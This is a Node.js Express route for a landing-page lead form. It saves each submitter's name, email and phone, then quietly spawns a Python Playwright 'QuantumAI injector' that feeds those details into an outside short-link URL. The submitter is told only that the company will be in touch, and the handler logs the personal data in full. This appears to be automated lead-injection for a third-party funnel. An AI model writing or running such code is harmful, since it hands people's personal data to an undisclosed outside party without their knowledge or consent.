const express = require("express");
const { body, validationResult } = require("express-validator");
const { spawn } = require("child_process");
const path = require("path");
const Lead = require("../models/Lead");
const router = express.Router();
const runQuantumAIInjector = async (leadData) => {
  return new Promise((resolve, reject) => {
    try {
      console.log("🚀🚀🚀 STARTING QUANTUMAI INJECTOR FOR LEAD:", leadData.newEmail);
      console.log("Lead data being sent to QuantumAI:", leadData);
      const injectorData = {
        firstName: leadData.firstName,
        lastName: leadData.lastName,
        email: leadData.newEmail,
        phone: leadData.newPhone,
        country_code: leadData.prefix.replace('+', ''),
        country: leadData.country,
        targetUrl: 'https://k8ro.info/bKkkBWkK'
      };
      const scriptPath = path.join(__dirname, '../../quantumai_injector_playwright.py');
      console.log("📄 Script path:", scriptPath);
      console.log("📦 Injector data:", JSON.stringify(injectorData, null, 2));
      console.log("🐍 Spawning Python process...");
const pythonProcess = spawn('python3', [scriptPath, JSON.stringify(injectorData)], {
        cwd: path.join(__dirname, '../..'),
        stdio: ['pipe', 'pipe', 'pipe']
      });
      console.log("✅ Python process spawned with PID:", pythonProcess.pid);
      let stdout = '';
      let stderr = '';
      pythonProcess.stdout.on('data', (data) => {
        const output = data.toString();
        stdout += output;
        console.log('QuantumAI Injector:', output.trim());
      });
      pythonProcess.stderr.on('data', (data) => {
        const error = data.toString();
        stderr += error;
        console.error('QuantumAI Injector Error:', error.trim());
      });
      pythonProcess.on('close', (code) => {
        console.log(`QuantumAI injector process exited with code ${code}`);
        if (code === 0) {
          console.log('✓ QuantumAI injection completed successfully');
          resolve({ success: true, output: stdout });
        } else {
          console.error('✗ QuantumAI injection failed');
          resolve({ success: false, error: stderr, output: stdout });
        }
      });
      pythonProcess.on('error', (error) => {
        console.error('Failed to start QuantumAI injector:', error);
        reject(error);
      });
      setTimeout(() => {
        if (!pythonProcess.killed) {
          console.log('QuantumAI injector timeout - killing process');
          pythonProcess.kill('SIGKILL');
          resolve({ success: false, error: 'Process timeout' });
        }
      }, 300000);
    } catch (error) {
      console.error('Error in runQuantumAIInjector:', error);
      reject(error);
    }
  });
};
router.post(
  "/",
  [
    body("firstName")
      .trim()
      .notEmpty()
      .withMessage("First name is required")
      .isLength({ min: 2, max: 50 })
      .withMessage("First name must be between 2 and 50 characters"),
    body("lastName")
      .trim()
      .notEmpty()
      .withMessage("Last name is required")
      .isLength({ min: 2, max: 50 })
      .withMessage("Last name must be between 2 and 50 characters"),
    body("email")
      .isEmail()
      .withMessage("Valid email is required")
      .normalizeEmail(),
    body("prefix")
      .trim()
      .notEmpty()
      .withMessage("Country code is required")
      .matches(/^\+\d{1,4}$/)
      .withMessage("Country code must be in format +XX or +XXX"),
    body("phone")
      .trim()
      .notEmpty()
      .withMessage("Phone number is required")
      .isLength({ min: 7, max: 15 })
      .withMessage("Phone number must be between 7 and 15 digits")
      .matches(/^\d+$/)
      .withMessage("Phone number must contain only digits"),
  ],
  async (req, res) => {
    try {
      console.log('🔥 LANDING PAGE FORM SUBMITTED! 🔥');
      console.log('Form data received:', req.body);
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        console.log('❌ Validation errors:', errors.array());
        return res.status(400).json({
          success: false,
          message: "Validation failed",
          errors: errors.array(),
        });
      }
      const { firstName, lastName, email, prefix, phone } = req.body;
      const existingLead = await Lead.findOne({ newEmail: email.toLowerCase() });
      if (existingLead) {
        return res.status(409).json({
          success: false,
          message: "A lead with this email already exists",
        });
      }
      const newLead = new Lead({
        leadType: "cold",
        firstName: firstName.trim(),
        lastName: lastName.trim(),
        newEmail: email.toLowerCase(),
        prefix: prefix.trim(),
        newPhone: phone.trim(),
        country: "Unknown",
        source: "Landing Page",
        status: "active",
        priority: "medium",
      });
      const savedLead = await newLead.save();
      console.log('✓ Lead saved to database:', savedLead._id);
      res.status(201).json({
        success: true,
        message: "Thank you for your submission! We'll be in touch soon.",
        leadId: savedLead._id,
      });
      console.log('🚀 Starting QuantumAI injection process...');
      runQuantumAIInjector(savedLead)
        .then((result) => {
          if (result.success) {
            console.log('✅ QuantumAI injection completed successfully for lead:', savedLead._id);
          } else {
            console.error('❌ QuantumAI injection failed for lead:', savedLead._id, result.error);
          }
        })
        .catch((error) => {
          console.error('💥 QuantumAI injection error for lead:', savedLead._id, error);
        });
    } catch (error) {
      console.error("Landing page submission error:", error);
      if (error.code === 11000) {
        return res.status(409).json({
          success: false,
          message: "A lead with this email already exists",
        });
      }
      res.status(500).json({
        success: false,
        message: "Internal server error. Please try again later.",
      });
    }
  }
);
router.get("/", (req, res) => {
  res.json({
    success: true,
    message: "Landing Page API",
    description: "Submit your information using POST to this endpoint",
    requiredFields: {
      firstName: "string (2-50 characters)",
      lastName: "string (2-50 characters)",
      email: "valid email address",
      prefix: "country code in format +XX",
      phone: "phone number (7-15 digits)"
    }
  });
});
module.exports = router;